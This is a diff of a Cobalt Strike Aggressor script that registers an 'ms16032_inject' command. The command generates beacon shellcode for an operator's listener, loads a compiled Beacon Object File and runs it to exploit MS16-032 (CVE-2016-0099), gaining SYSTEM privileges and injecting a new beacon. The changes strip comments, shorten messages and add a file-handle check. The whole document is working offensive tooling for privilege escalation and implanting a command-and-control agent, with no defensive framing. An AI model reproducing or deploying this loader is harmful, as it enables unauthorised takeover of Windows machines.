@@ -1,22 +1,15 @@
-# MS16-032 Beacon Object File with Direct Beacon Injection
-# Exploits CVE-2016-0099 to gain SYSTEM privileges and inject beacon shellcode
-
+# MS16-032 BOF - Direct Beacon Injection
 alias ms16032_inject {
-    local('$barch $handle $data $args $listener $payload $size');
+    local('$barch $handle $data $args $listener $payload');
     
-    # Check if listener was specified
     if(size(@_) < 2) {
         berror($1, "Usage: ms16032_inject <listener>");
-        berror($1, "Example: ms16032_inject http_listener");
         return;
     }
     
     $listener = $2;
-    
-    # Get beacon architecture
     $barch = barch($1);
     
-    # Generate shellcode for the specified listener
     if($barch eq "x64") {
         $payload = payload($listener, "x64", "thread");
     }
@@ -24,18 +17,13 @@ alias ms16032_inject {
         $payload = payload($listener, "x86", "thread");
     }
     
-    # Check if payload generation succeeded
     if(strlen($payload) == 0) {
-        berror($1, "Failed to generate payload for listener: $listener");
-        berror($1, "Make sure the listener exists and is active");
+        berror($1, "Failed to generate payload");
         return;
     }
     
-    $size = strlen($payload);
-    blog($1, "Generated $size bytes of shellcode for $listener");
-    blog($1, "Architecture: $barch");
+    blog($1, "Generated payload for listener");
     
-    # Read the appropriate BOF file
     if($barch eq "x64") {
         $handle = openf(script_resource("ms16032_inject.x64.o"));
     }
@@ -43,30 +31,23 @@ alias ms16032_inject {
         $handle = openf(script_resource("ms16032_inject.x86.o"));
     }
     
+    if($handle is $null) {
+        berror($1, "Could not open BOF file");
+        return;
+    }
+    
     $data = readb($handle, -1);
     closef($handle);
     
     if(strlen($data) == 0) {
-        berror($1, "Could not read BOF file");
-        berror($1, "Make sure ms16032_inject.x64.o or ms16032_inject.x86.o is in the same directory as this script");
+        berror($1, "BOF file is empty");
         return;
     }
     
-    # Pack the shellcode as binary data
     $args = bof_pack($1, "b", $payload);
     
-    # Execute BOF
-    btask($1, "Tasked beacon to run MS16-032 with beacon injection");
+    btask($1, "Executing MS16-032");
     beacon_inline_execute($1, $data, "go", $args);
 }
 
-beacon_command_register(
-    "ms16032_inject",
-    "MS16-032 local privilege escalation with beacon injection",
-    "Usage: ms16032_inject <listener>\n\n" .
-    "Exploits MS16-032 to gain SYSTEM privileges and inject a new beacon.\n\n" .
-    "Examples:\n" .
-    "  ms16032_inject http_listener\n" .
-    "  ms16032_inject https_listener\n" .
-    "  ms16032_inject smb_listener"
-);
+beacon_command_register("ms16032_inject", "MS16-032 LPE with beacon injection", "Usage: ms16032_inject <listener>");
